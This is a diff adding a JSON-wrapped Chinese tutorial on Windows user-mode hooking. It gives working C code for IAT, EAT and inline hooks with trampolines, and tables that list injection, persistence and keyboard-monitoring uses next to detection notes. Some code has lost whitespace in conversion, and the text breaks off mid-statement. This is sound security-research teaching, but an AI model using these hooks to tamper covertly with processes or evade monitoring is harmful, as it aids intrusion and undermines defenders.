@@ -1,0 +1,651 @@
+{
+  "id": "preview-de65af55802d94ec",
+  "path": "15_HOOK专题/08_Windows 全架构 Hook 技术图谱-用户态 Hook（Ring 3).md",
+  "originalHash": "61dc45350cd43f97dd0d746b3b646f57edadf8391e71f376fda095808f338cc3",
+  "bytes": 117262,
+  "elapsedMs": 2131,
+  "context": {
+    "mediaMap": {},
+    "articleMap": {}
+  },
+  "schemaVersion": "notes-html/1",
+  "versions": {
+    "schema": "notes-html/1",
+    "converter": "2.0.0",
+    "sanitizer": "2.0.0",
+    "renderer": "2.0.0"
+  },
+  "status": "review_required",
+  "htmlSource": "<h1 id=\"section-1\">08_Windows 全架构 Hook 技术图谱 - 用户态 Hook（Ring 3）</h1><p>用户态 Hook 是最基础的拦截手段：所有逻辑运行在 Ring 3（应用层），不依赖内核驱动。反作弊/EDR 只要扫描进程内存、对比磁盘映像、枚举系统回调，就能发现大部分用户态 Hook。隐蔽性普遍较低，但开发成本也最低，仍是安全研究、调试辅助、兼容性补丁的第一选择。</p><hr><h2 id=\"section-2\">导读：用户态 Hook 技术全景</h2><pre data-note-kind=\"mermaid\"><code>flowchart TB\n    subgraph 函数拦截类[\"函数拦截类（改调用目标）\"]\n        IAT[\"1.1 IAT Hook&lt;br/&gt;改导入表指针\"]\n        EAT[\"1.2 EAT Hook&lt;br/&gt;改导出表 RVA\"]\n        INLINE[\"1.3 Inline Hook&lt;br/&gt;改函数头指令\"]\n        HOTPATCH[\"1.7 Hotpatch Hook&lt;br/&gt;利用热补丁槽位\"]\n        SYSCALL[\"1.9 Syscall Hook&lt;br/&gt;改 ntdll stub\"]\n    end\n\n    subgraph 异常劫持类[\"异常劫持类（不改函数体）\"]\n        VEH[\"1.4 VEH Hook&lt;br/&gt;硬件断点 + VEH\"]\n        GUARD[\"1.5 PAGE_GUARD Hook&lt;br/&gt;页守卫异常\"]\n        TLS[\"1.6 TLS Callback&lt;br/&gt;极早执行时机\"]\n        INST[\"1.8 Instrumentation Callback&lt;br/&gt;syscall 返回拦截\"]\n    end\n\n    subgraph 系统机制类[\"系统机制类（借 Windows 特性）\"]\n        SWH[\"1.10 SetWindowsHookEx&lt;br/&gt;消息钩子\"]\n        APPINIT[\"1.11 AppInit_DLLs&lt;br/&gt;全局 DLL 注入\"]\n        IFEO[\"1.12 IFEO&lt;br/&gt;映像劫持\"]\n        IME[\"1.13 IME 注入\"]\n        SHIM[\"1.14 Shim Engine\"]\n        COM[\"1.15 COM Hijacking\"]\n        LSP[\"1.16 Winsock LSP\"]\n        DLLH[\"1.17 DLL 搜索顺序劫持\"]\n    end\n\n    CALL[\"程序调用 API\"] --&gt; IAT\n    CALL --&gt; INLINE\n    CALL --&gt; VEH\n    GETPROC[\"GetProcAddress\"] --&gt; EAT\n    SYSCALL_RET[\"syscall 从内核返回\"] --&gt; INST\n</code></pre><h3 id=\"section-3\">技术速查对比表</h3><table><thead><tr><th>编号</th><th>技术</th><th>常用度</th><th>隐蔽性</th><th>通用性</th><th>现代 Windows 状态</th><th>典型场景</th></tr></thead><tbody><tr><td>1.1</td><td>IAT Hook</td><td>★★★★★</td><td>★☆☆☆☆</td><td>仅静态导入</td><td>完全可用</td><td>进程内 API 监控、简单拦截</td></tr><tr><td>1.2</td><td>EAT Hook</td><td>★★☆☆☆</td><td>★☆☆☆☆</td><td>仅 GetProcAddress 路径</td><td>完全可用</td><td>影响后续动态解析</td></tr><tr><td>1.3</td><td>Inline Hook</td><td>★★★★★</td><td>★★☆☆☆</td><td>任意函数</td><td>完全可用</td><td>通用 API 拦截（Detours/MinHook）</td></tr><tr><td>1.4</td><td>VEH Hook</td><td>★★★☆☆</td><td>★★★☆☆</td><td>任意地址（≤4 个）</td><td>完全可用</td><td>零字节修改的研究型 Hook</td></tr><tr><td>1.5</td><td>PAGE_GUARD</td><td>★☆☆☆☆</td><td>★★☆☆☆</td><td>页粒度</td><td>概念验证</td><td>几乎不用于生产</td></tr><tr><td>1.6</td><td>TLS Callback</td><td>★★★☆☆</td><td>★★☆☆☆</td><td>执行时机</td><td>完全可用</td><td>极早 Hook、反调试、配合 VEH</td></tr><tr><td>1.7</td><td>Hotpatch</td><td>★☆☆☆☆</td><td>★★☆☆☆</td><td>热补丁函数</td><td>x64 基本不可用</td><td>仅 x86/旧系统</td></tr><tr><td>1.8</td><td>Instrumentation Callback</td><td>★★☆☆☆</td><td>★★★☆☆</td><td>全部 syscall 返回</td><td>Win10+ x64</td><td>研究/红队 syscall 监控</td></tr><tr><td>1.9</td><td>Syscall Hook</td><td>★★★★☆</td><td>★★☆☆☆</td><td>ntdll syscall stub</td><td>完全可用</td><td>对抗直接 syscall</td></tr><tr><td>1.10</td><td>SetWindowsHookEx</td><td>★★★★☆</td><td>★★☆☆☆</td><td>消息/输入</td><td>完全可用</td><td>键盘鼠标监控、DLL 注入</td></tr><tr><td>1.11</td><td>AppInit_DLLs</td><td>★☆☆☆☆</td><td>★☆☆☆☆</td><td>全局注入</td><td>Win10+ 基本禁用</td><td>历史技术，了解即可</td></tr><tr><td>1.12</td><td>IFEO</td><td>★★★☆☆</td><td>★★☆☆☆</td><td>启动重定向</td><td>完全可用</td><td>调试器、启动时注入</td></tr><tr><td>1.13</td><td>IME 注入</td><td>★☆☆☆☆</td><td>★★☆☆☆</td><td>GUI 进程</td><td>仍可用但罕见</td><td>历史攻击向量</td></tr><tr><td>1.14</td><td>Shim Engine</td><td>★★☆☆☆</td><td>★★★☆☆</td><td>指定进程</td><td>完全可用</td><td>兼容性补丁/持久化</td></tr><tr><td>1.15</td><td>COM Hijacking</td><td>★★★★☆</td><td>★★★☆☆</td><td>COM 加载路径</td><td>完全可用</td><td>无管理员持久化</td></tr><tr><td>1.16</td><td>Winsock LSP</td><td>★☆☆☆☆</td><td>★★☆☆☆</td><td>网络栈</td><td>已弃用，仍兼容</td><td>被 WFP 取代</td></tr><tr><td>1.17</td><td>DLL 搜索顺序劫持</td><td>★★★★☆</td><td>★★☆☆☆</td><td>DLL 加载</td><td>完全可用</td><td>代理 DLL、侧加载</td></tr></tbody></table><h3 id=\"section-4\">阅读建议</h3><ul><li><strong>入门必学</strong>：1.1 IAT Hook → 1.3 Inline Hook → 1.9 Syscall Hook（理解现代绕过链）</li><li><strong>隐蔽性研究</strong>：1.4 VEH Hook → 1.8 Instrumentation Callback</li><li><strong>持久化/注入</strong>：1.15 COM Hijacking → 1.17 DLL 搜索顺序劫持 → 1.12 IFEO</li><li><strong>历史/已弱化</strong>：1.7 Hotpatch、1.11 AppInit_DLLs、1.16 LSP — 保留学习价值，生产环境慎用</li></ul><hr><h2 id=\"section-5\">1.1 IAT Hook（导入地址表 Hook）</h2><h3 id=\"section-6\">技术定位</h3><p><strong>常用度最高</strong>的用户态 Hook 之一。适合 Hook 通过 PE 导入表<strong>静态链接</strong>的 API（如 <code>kernel32!OpenProcess</code>）。实现简单、稳定，是理解 PE 结构与 Hook 链路的最佳起点。</p><h3 id=\"section-7\">原理</h3><p>PE 文件加载时，Windows Loader 会解析导入表，将每个导入函数的实际地址写入 <strong>IAT（Import Address Table）</strong>。程序通过 IAT 中的函数指针发起调用。IAT Hook 直接替换该指针，使调用跳转到你的 Hook 函数。</p><pre data-note-kind=\"mermaid\"><code>sequenceDiagram\n    participant App as 应用程序\n    participant IAT as IAT 表\n    participant Hook as Hook 函数\n    participant API as 原始 API\n\n    Note over App,API: Hook 安装前\n    App-&gt;&gt;IAT: call [IAT_OpenProcess]\n    IAT-&gt;&gt;API: 跳转到 kernel32!OpenProcess\n\n    Note over App,API: IAT Hook 后\n    App-&gt;&gt;IAT: call [IAT_OpenProcess]\n    IAT-&gt;&gt;Hook: 跳转到 HookedOpenProcess\n    Hook-&gt;&gt;API: 过滤/记录后调用 OriginalOpenProcess\n</code></pre><h3 id=\"section-8\">PE 背景：INT 与 IAT 的区别</h3><table><thead><tr><th>结构</th><th>加载前</th><th>加载后</th><th>Hook 修改对象</th></tr></thead><tbody><tr><td><strong>INT</strong>（OriginalFirstThunk）</td><td>保存函数名/序号</td><td>通常不变</td><td>❌ 不修改</td></tr><tr><td><strong>IAT</strong>（FirstThunk）</td><td>与 INT 相同</td><td>被 Loader 覆写为真实函数地址</td><td>✅ 修改这里</td></tr></tbody></table><blockquote><p><strong>通俗理解</strong>：INT 是\"菜单\"（函数名列表），IAT 是\"电话簿\"（实际拨号地址）。Hook 只需改电话簿里的号码。</p></blockquote><h3 id=\"section-9\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;winternl.h&gt;\n\ntypedef HANDLE(WINAPI* fnOpenProcess)(DWORD, BOOL, DWORD);\nfnOpenProcess OriginalOpenProcess = NULL;\n\n// Hook 函数\nHANDLE WINAPI HookedOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {\n// 过滤掉对保护进程的访问\nif (dwProcessId == GetProtectedPid()) {\n        SetLastError(ERROR_ACCESS_DENIED);\nreturn NULL;\n    }\nreturn OriginalOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);\n}\n\n// IAT Hook 核心逻辑\nBOOL IatHook(HMODULE hModule, const char* dllName, const char* funcName, PVOID hookFunc, PVOID* originalFunc) {\n// 获取 DOS Header\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;\nif (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE) return FALSE;\n\n// 获取 NT Header\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDos-&gt;e_lfanew);\nif (pNt-&gt;Signature != IMAGE_NT_SIGNATURE) return FALSE;\n\n// 获取导入表 RVA\n    DWORD importRva = pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;\nif (importRva == 0) return FALSE;\n\n    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + importRva);\n\n// 遍历每个导入的 DLL\nwhile (pImport-&gt;Name) {\nchar* modName = (char*)((BYTE*)hModule + pImport-&gt;Name);\nif (_stricmp(modName, dllName) == 0) {\n// 找到目标 DLL，遍历其 IAT\n            PIMAGE_THUNK_DATA pOrigThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImport-&gt;OriginalFirstThunk);\n            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImport-&gt;FirstThunk);\n\nwhile (pOrigThunk-&gt;u1.AddressOfData) {\n// 通过名字匹配\nif (!(pOrigThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG)) {\n                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + pOrigThunk-&gt;u1.AddressOfData);\nif (strcmp(pName-&gt;Name, funcName) == 0) {\n// 找到目标函数，保存原始地址\n                        *originalFunc = (PVOID)pThunk-&gt;u1.Function;\n\n// 修改内存保护\n                        DWORD oldProtect;\n                        VirtualProtect(&amp;pThunk-&gt;u1.Function, sizeof(ULONG_PTR), PAGE_READWRITE, &amp;oldProtect);\n                        pThunk-&gt;u1.Function = (ULONG_PTR)hookFunc;\n                        VirtualProtect(&amp;pThunk-&gt;u1.Function, sizeof(ULONG_PTR), oldProtect, &amp;oldProtect);\nreturn TRUE;\n                    }\n                }\n                pOrigThunk++;\n                pThunk++;\n            }\n        }\n        pImport++;\n    }\nreturn FALSE;\n}\n\n// 使用\nvoid InstallIatHook() {\n    IatHook(GetModuleHandle(NULL), \"kernel32.dll\", \"OpenProcess\", \n            HookedOpenProcess, (PVOID*)&amp;OriginalOpenProcess);\n}\n</code></pre><h3 id=\"section-10\">检测难度：★☆☆☆☆</h3><p>遍历 IAT，对比每个条目是否指向对应 DLL 的地址范围内即可发现。CRC 校验 IAT 区域也能立即暴露。</p><p><strong>常见检测手段</strong>：</p><ul><li>对比 IAT 指针与 <code>GetProcAddress</code> 返回值</li><li>将 IAT 区域与磁盘 PE 的导入表期望值比对</li><li>监控 <code>VirtualProtect</code> 对 IAT 所在可写区域的修改</li></ul><h3 id=\"section-11\">更易理解的精简示例</h3><p>下面是最小化版本，帮助理解核心三步：<strong>找 IAT 条目 → 保存原地址 → 替换指针</strong>。</p><pre><code class=\"language-c\">// 精简版：演示 Hook 当前进程 exe 中 user32!MessageBoxA 的思路\ntypedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);\nMessageBoxA_t g_RealMessageBoxA = NULL;\n\nint WINAPI FakeMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {\n    return g_RealMessageBoxA(hWnd, \"IAT Hook 成功!\", lpCaption, uType);\n}\n\n// 核心逻辑（遍历部分复用上方 IatHook）：\n// 1. IatHook(hExe, \"user32.dll\", \"MessageBoxA\", FakeMessageBoxA, &amp;g_RealMessageBoxA)\n// 2. g_RealMessageBoxA 保存原始函数，供 Hook 内回调\n// 3. 程序下次 call [IAT_MessageBoxA] 就会进入 FakeMessageBoxA\n</code></pre><h3 id=\"section-12\">实战要点</h3><ol><li><strong>多模块问题</strong>：每个 DLL 有独立 IAT，仅 Hook 主程序不够。</li><li><strong>生产环境推荐</strong>：学习用手写 IAT Hook；工程上更常用 <a href=\"https://github.com/microsoft/Detours\">Microsoft Detours</a> 或 <a href=\"https://github.com/TsudaKageyu/minhook\">MinHook</a>（Inline Hook，覆盖面更广）。</li><li><strong>x86/x64</strong>：<code>pThunk-&gt;u1.Function</code> 用 <code>ULONG_PTR</code> 保证跨架构。</li></ol><h3 id=\"section-13\">局限</h3><ul><li>只能 Hook 通过 IAT 调用的函数，<code>GetProcAddress</code> 后<strong>直接 call 寄存器</strong>的路径不经过 IAT</li><li>每个模块有独立的 IAT，需要逐一修改</li><li>任何内存扫描工具都能发现 IAT 指针异常</li></ul><hr><h2 id=\"section-14\">1.2 EAT Hook（导出地址表 Hook）</h2><h3 id=\"section-15\">技术定位</h3><p><strong>较少直接使用</strong>。修改 DLL 的导出表，影响后续通过 <code>GetProcAddress</code> / <code>LdrGetProcedureAddress</code> 解析的路径。对已缓存函数地址的模块无效。实战中更多作为理解 PE 导出机制的学习案例。</p><h3 id=\"section-16\">原理</h3><p>修改 DLL 的 EAT（Export Address Table），让后续模块通过 <code>GetProcAddress</code> 获取到的地址指向 Hook 函数（以 RVA 形式写入导出表）。</p><pre data-note-kind=\"mermaid\"><code>flowchart LR\n    A[\"调用方 GetProcAddress(hDll, 'Func')\"] --&gt; B[\"读取 EAT 中 Func 的 RVA\"]\n    B --&gt; C{\"EAT 是否被 Hook?\"}\n    C --&gt;|否| D[\"返回 DLL基址 + 原始RVA\"]\n    C --&gt;|是| E[\"返回 DLL基址 + HookRVA\"]\n    E --&gt; F[\"调用方拿到 Hook 函数地址\"]\n</code></pre><h3 id=\"section-17\">完整实现</h3><pre><code class=\"language-c\">BOOL EatHook(HMODULE hDll, const char* funcName, PVOID hookFunc, PVOID* originalFunc) {\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hDll;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hDll + pDos-&gt;e_lfanew);\n\n    DWORD exportRva = pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\n    if (exportRva == 0) return FALSE;\n\n    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hDll + exportRva);\n    DWORD* pFunctions = (DWORD*)((BYTE*)hDll + pExport-&gt;AddressOfFunctions);\n    DWORD* pNames = (DWORD*)((BYTE*)hDll + pExport-&gt;AddressOfNames);\n    WORD* pOrdinals = (WORD*)((BYTE*)hDll + pExport-&gt;AddressOfNameOrdinals);\n\n    for (DWORD i = 0; i &lt; pExport-&gt;NumberOfNames; i++) {\n        char* name = (char*)((BYTE*)hDll + pNames[i]);\n        if (strcmp(name, funcName) == 0) {\n            // 保存原始函数地址\n            *originalFunc = (PVOID)((BYTE*)hDll + pFunctions[pOrdinals[i]]);\n\n            // 计算 Hook 函数相对于 DLL 基址的 RVA\n            DWORD hookRva = (DWORD)((BYTE*)hookFunc - (BYTE*)hDll);\n\n            DWORD oldProtect;\n            VirtualProtect(&amp;pFunctions[pOrdinals[i]], sizeof(DWORD), PAGE_READWRITE, &amp;oldProtect);\n            pFunctions[pOrdinals[i]] = hookRva;\n            VirtualProtect(&amp;pFunctions[pOrdinals[i]], sizeof(DWORD), oldProtect, &amp;oldProtect);\n            return TRUE;\n        }\n    }\n    return FALSE;\n}\n\n// 注意：EAT Hook 的 hookFunc 地址必须在目标 DLL 的地址空间内\n// 否则 RVA 会溢出。解决方案：在目标 DLL 附近分配内存作为跳板\nPVOID AllocateNearby(HMODULE hDll, SIZE_T size) {\n    MEMORY_BASIC_INFORMATION mbi;\n    BYTE* addr = (BYTE*)hDll;\n\n    // 在 DLL 前后 2GB 范围内找可用空间（RVA 是 32 位有符号偏移）\n    for (BYTE* p = addr - 0x70000000; p &lt; addr + 0x70000000; p += mbi.RegionSize) {\n        if (VirtualQuery(p, &amp;mbi, sizeof(mbi)) == 0) continue;\n        if (mbi.State == MEM_FREE &amp;&amp; mbi.RegionSize &gt;= size) {\n            PVOID alloc = VirtualAlloc(p, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n            if (alloc) return alloc;\n        }\n    }\n    return NULL;\n}\n</code></pre><h3 id=\"section-18\">关键限制说明</h3><table><thead><tr><th>问题</th><th>原因</th><th>常见解法</th></tr></thead><tbody><tr><td>Hook 函数必须在 DLL 映像 ±2GB 内</td><td>EAT 存的是 32 位 RVA</td><td><code>AllocateNearby</code> 在附近分配跳板</td></tr><tr><td>已缓存地址的模块不受影响</td><td><code>GetProcAddress</code> 只调用一次</td><td>需在目标模块加载前 Hook，或改用 Inline Hook</td></tr><tr><td>转发导出（Forwarder RVA）</td><td>导出项指向另一个 DLL 的字符串</td><td>无法直接 EAT Hook，需处理转发链</td></tr></tbody></table><h3 id=\"section-19\">检测难度：★☆☆☆☆</h3><p>和 IAT Hook 一样，对比 EAT 条目与磁盘原始文件即可发现。</p><h3 id=\"section-20\">局限</h3><ul><li>只对后续调用 <code>GetProcAddress</code> 的模块有效</li><li>已经缓存了函数地址的模块不受影响</li><li>同样是从内存修改，扫描即暴露</li></ul><hr><h2 id=\"section-21\">1.3 Inline Hook（内联 Hook / Detour）</h2><h3 id=\"section-22\">技术定位</h3><p><strong>最常用的通用 Hook 技术</strong>。不依赖 IAT/EAT，直接修改目标函数头部指令，写入跳转跳到 Hook 函数。Microsoft Detours、MinHook、EasyHook 等工业级库均基于此原理。</p><h3 id=\"section-23\">原理</h3><p>直接修改目标函数的头部字节，写入一条 <code>jmp</code> 指令跳转到 Hook 函数。执行完自定义逻辑后，通过 <strong>Trampoline（跳板）</strong> 执行被覆盖的原始指令，再跳回原函数继续执行。</p><pre data-note-kind=\"mermaid\"><code>flowchart LR\n    subgraph 安装前\n        A1[\"目标函数入口&lt;br/&gt;原始指令...\"]\n    end\n    subgraph 安装后\n        B1[\"jmp Detour\"] --&gt; B2[\"Hook 函数&lt;br/&gt;自定义逻辑\"]\n        B2 --&gt; B3[\"Trampoline&lt;br/&gt;被覆盖的原始指令\"]\n        B3 --&gt; B4[\"jmp 回原函数+N\"]\n    end\n</code></pre><p><strong>x64 绝对跳转指令（14 字节）</strong>：</p><pre><code class=\"language-text\">FF 25 00 00 00 00    ; jmp qword ptr [rip+0]\n[8 字节绝对地址]      ; Detour 函数地址\n</code></pre><h3 id=\"section-24\">完整实现（含指令重定位引擎）</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;stdint.h&gt;\n\n// x64 指令长度解析器（简化版，覆盖常见指令）\n// 完整版应使用 Zydis/distorm 等反汇编库\ntypedef struct _INSTRUCTION {\nuint8_t length;\n    BOOL isRipRelative;      // 是否包含 RIP 相对寻址\nint32_t ripOffset;       // RIP 偏移在指令中的位置\nint32_t ripDisplacement; // 原始 displacement 值\n} INSTRUCTION;\n\n// 解析单条指令长度（简化版核心逻辑）\nINSTRUCTION ParseInstruction(constuint8_t* code) {\n    INSTRUCTION inst = {0};\nconstuint8_t* p = code;\n\n// 跳过前缀 (REX, LOCK, REP, segment override 等)\nwhile (*p == 0xF0 || *p == 0xF2 || *p == 0xF3 || \n           *p == 0x26 || *p == 0x2E || *p == 0x36 || *p == 0x3E ||\n           *p == 0x64 || *p == 0x65 || *p == 0x66 || *p == 0x67 ||\n           (*p &gt;= 0x40 &amp;&amp; *p &lt;= 0x4F)) { // REX prefix\n        p++;\n    }\n\nuint8_t opcode = *p++;\n\n// 处理双字节操作码 (0F xx)\nif (opcode == 0x0F) {\nuint8_t op2 = *p++;\n// ModRM\nif (op2 &gt;= 0x80 &amp;&amp; op2 &lt;= 0x8F) {\n// Jcc rel32 (条件跳转)\n            inst.length = (int)(p - code) + 4;\n            inst.isRipRelative = TRUE;\n            inst.ripOffset = (int)(p - code);\n            inst.ripDisplacement = *(int32_t*)p;\nreturn inst;\n        }\n// 其他 0F xx 指令处理...\nif ((op2 &amp; 0xC0) != 0xC0) { // 有 ModRM\nuint8_t modrm = *p++;\nuint8_t mod = (modrm &gt;&gt; 6) &amp; 3;\nuint8_t rm = modrm &amp; 7;\nif (mod == 0 &amp;&amp; rm == 5) { // RIP-relative\n                inst.isRipRelative = TRUE;\n                inst.ripOffset = (int)(p - code);\n                inst.ripDisplacement = *(int32_t*)p;\n                p += 4;\n            } else if (mod == 0 &amp;&amp; rm == 4) { p++; } // SIB\nelse if (mod == 1) { if (rm == 4) p++; p++; }\nelse if (mod == 2) { if (rm == 4) p++; p += 4; }\n        }\n        inst.length = (int)(p - code);\nreturn inst;\n    }\n\n// 单字节操作码处理\nswitch (opcode) {\ncase 0xE8: // CALL rel32\ncase 0xE9: // JMP rel32\n            inst.length = (int)(p - code) + 4;\n            inst.isRipRelative = TRUE;\n            inst.ripOffset = (int)(p - code);\n            inst.ripDisplacement = *(int32_t*)p;\nreturn inst;\ncase 0xEB: // JMP rel8\n            inst.length = (int)(p - code) + 1;\n            inst.isRipRelative = TRUE;\n            inst.ripOffset = (int)(p - code);\n            inst.ripDisplacement = (int8_t)*p;\nreturn inst;\n// ... 其他操作码\n    }\n\n// 通用 ModRM 解析\n// (这里省略完整的操作码表映射，实际项目应使用 Zydis)\n    inst.length = (int)(p - code);\nif (inst.length == 0) inst.length = 1; // 兜底\nreturn inst;\n}\n\n// Trampoline 构建器：将被覆盖的原始指令复制到 trampoline，并修正 RIP 相对引用\n#define HOOK_STUB_SIZE 14  // x64 绝对跳转: FF 25 00 00 00 00 [8字节地址]\n#define TRAMPOLINE_MAX 64\n\ntypedef struct _HOOK_CONTEXT {\nvoid* pTarget;                           // 原始函数地址\nvoid* pDetour;                           // Hook 函数地址\nuint8_t trampoline[TRAMPOLINE_MAX];      // Trampoline 缓冲区\nuint8_t originalBytes[HOOK_STUB_SIZE];   // 备份的原始字节\nuint32_t stolenLength;                   // 实际偷取的字节数\nvoid* pTrampoline;                       // Trampoline 可执行内存\n} HOOK_CONTEXT;\n\nBOOL BuildTrampoline(HOOK_CONTEXT* ctx) {\nuint8_t* src = (uint8_t*)ctx-&gt;pTarget;\nuint8_t* dst = ctx-&gt;trampoline;\nuint32_t totalCopied = 0;\n\n// 需要至少偷取 HOOK_STUB_SIZE 字节的完整指令\nwhile (totalCopied &lt; HOOK_STUB_SIZE) {\n        INSTRUCTION inst = ParseInstruction(src + totalCopied);\n\nif (inst.isRipRelative) {\n// RIP 相对指令需要重定位\n// 计算原始目标地址\nuint8_t* originalRip = src + totalCopied + inst.length; // 执行完该指令后的 RIP\nvoid* absoluteTarget = originalRip + inst.ripDisplacement;\n\n// 计算新的 displacement（从 trampoline 中的新位置到同一个绝对目标）\nuint8_t* newRip = dst + inst.length;\nint64_t newDisp = (int64_t)((uint8_t*)absoluteTarget - newRip);\n\nif (newDisp &gt; INT32_MAX || newDisp &lt; INT32_MIN) {\n// 距离超过 ±2GB，需要用绝对跳转间接寻址\n// 这种情况在 trampoline 分配在远处时会发生\n// 解决：在 trampoline 末尾放跳转表\nmemcpy(dst, src + totalCopied, inst.length);\n// 将 displacement 改为指向 trampoline 内的跳转表\n// （此处简化处理，实际需要跳转表机制）\nreturn FALSE; // 需要更复杂的处理\n            }\n\n// 复制指令，修改 displacement\nmemcpy(dst, src + totalCopied, inst.length);\n            *(int32_t*)(dst + inst.ripOffset) = (int32_t)newDisp;\n        } else {\n// 非 RIP 相对指令，直接复制\nmemcpy(dst, src + totalCopied, inst.length);\n        }\n\n        dst += inst.length;\n        totalCopied += inst.length;\n    }\n\n    ctx-&gt;stolenLength = totalCopied;\n\n// 在 trampoline 末尾追加绝对跳转回原始函数（跳过被偷取的部分）\n// FF 25 00 00 00 00 [目标地址 8字节]\n    *dst++ = 0xFF;\n    *dst++ = 0x25;\n    *(uint32_t*)dst = 0; dst += 4;\n    *(uint64_t*)dst = (uint64_t)(src + totalCopied); dst += 8;\n\n// 分配可执行内存给 trampoline\nsize_t trampolineSize = (size_t)(dst - ctx-&gt;trampoline);\n    ctx-&gt;pTrampoline = VirtualAlloc(NULL, trampolineSize, \n        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\nif (!ctx-&gt;pTrampoline) return FALSE;\n\nmemcpy(ctx-&gt;pTrampoline, ctx-&gt;trampoline, trampolineSize);\nreturn TRUE;\n}\n\n// 安装 Hook\nBOOL InstallInlineHook(HOOK_CONTEXT* ctx) {\n// 备份原始字节\nmemcpy(ctx-&gt;originalBytes, ctx-&gt;pTarget, HOOK_STUB_SIZE);\n\n// 构建 Trampoline\nif (!BuildTrampoline(ctx)) return FALSE;\n\n// 写入跳转到 Detour\n    DWORD oldProtect;\nVirtualProtect(ctx-&gt;pTarget, HOOK_STUB_SIZE, PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n\nuint8_t* p = (uint8_t*)ctx-&gt;pTarget;\n    p[0] = 0xFF;\n    p[1] = 0x25;\n    *(uint32_t*)(p + 2) = 0;\n    *(uint64_t*)(p + 6) = (uint64_t)ctx-&gt;pDetour;\n\nVirtualProtect(ctx-&gt;pTarget, HOOK_STUB_SIZE, oldProtect, &amp;oldProtect);\nFlushInstructionCache(GetCurrentProcess(), ctx-&gt;pTarget, HOOK_STUB_SIZE);\nreturn TRUE;\n}\n\n// 卸载 Hook\nBOOL RemoveInlineHook(HOOK_CONTEXT* ctx) {\n    DWORD oldProtect;\nVirtualProtect(ctx-&gt;pTarget, HOOK_STUB_SIZE, PAGE_EXECUTE_READWRITE, &amp;oldProtect);\nmemcpy(ctx-&gt;pTarget, ctx-&gt;originalBytes, HOOK_STUB_SIZE);\nVirtualProtect(ctx-&gt;pTarget, HOOK_STUB_SIZE, oldProtect, &amp;oldProtect);\nFlushInstructionCache(GetCurrentProcess(), ctx-&gt;pTarget, HOOK_STUB_SIZE);\n\nif (ctx-&gt;pTrampoline) {\nVirtualFree(ctx-&gt;pTrampoline, 0, MEM_RELEASE);\n        ctx-&gt;pTrampoline = NULL;\n    }\nreturn TRUE;\n}\n\n// 线程安全 Hook 安装（暂停其他线程避免竞态）\nBOOL SafeInstallHook(HOOK_CONTEXT* ctx) {\n// 挂起所有其他线程\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n    THREADENTRY32 te = { .dwSize = sizeof(te) };\n    DWORD currentThread = GetCurrentThreadId();\n    DWORD currentProcess = GetCurrentProcessId();\n\n    HANDLE suspendedThreads[256];\nint suspendCount = 0;\n\nif (Thread32First(hSnap, &amp;te)) {\ndo {\nif (te.th32OwnerProcessID == currentProcess &amp;&amp; te.th32ThreadID != currentThread) {\n                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);\nif (hThread) {\nSuspendThread(hThread);\n                    suspendedThreads[suspendCount++] = hThread;\n                }\n            }\n        } while (Thread32Next(hSnap, &amp;te) &amp;&amp; suspendCount &lt; 256);\n    }\nCloseHandle(hSnap);\n\n// 安装 Hook\n    BOOL result = InstallInlineHook(ctx);\n\n// 恢复所有线程\nfor (int i = 0; i &lt; suspendCount; i++) {\nResumeThread(suspendedThreads[i]);\nCloseHandle(suspendedThreads[i]);\n    }\nreturn result;\n}\n</code></pre><h3 id=\"section-25\">检测难度：★★☆☆☆</h3><p>读取函数头几字节，对比磁盘上的原始 DLL 即可发现。大部分反作弊都会做完整性校验。</p><h3 id=\"section-26\">更易理解的 MinHook 用法示例</h3><p>生产环境不建议手写指令解析器。下面是用 <a href=\"https://github.com/TsudaKageyu/minhook\">MinHook</a> 实现同等效果的最小示例（库内部处理了 Trampoline 与 RIP 重定位）：</p><pre><code class=\"language-c\">#include \"MinHook.h\"\n#include &lt;windows.h&gt;\n\ntypedef int (WINAPI *MessageBoxW_t)(HWND, LPCWSTR, LPCWSTR, UINT);\nMessageBoxW_t fpMessageBoxW = NULL;\n\nint WINAPI DetourMessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) {\n    // 自定义逻辑\n    return fpMessageBoxW(hWnd, L\"已被 Inline Hook\", lpCaption, uType);\n}\n\nBOOL InstallMinHookExample(void) {\n    if (MH_Initialize() != MH_OK) return FALSE;\n\n    // MH_CreateHook 参数：目标地址、Detour、保存原始函数的指针\n    if (MH_CreateHook(&amp;MessageBoxW, &amp;DetourMessageBoxW, (LPVOID*)&amp;fpMessageBoxW) != MH_OK)\n        return FALSE;\n\n    if 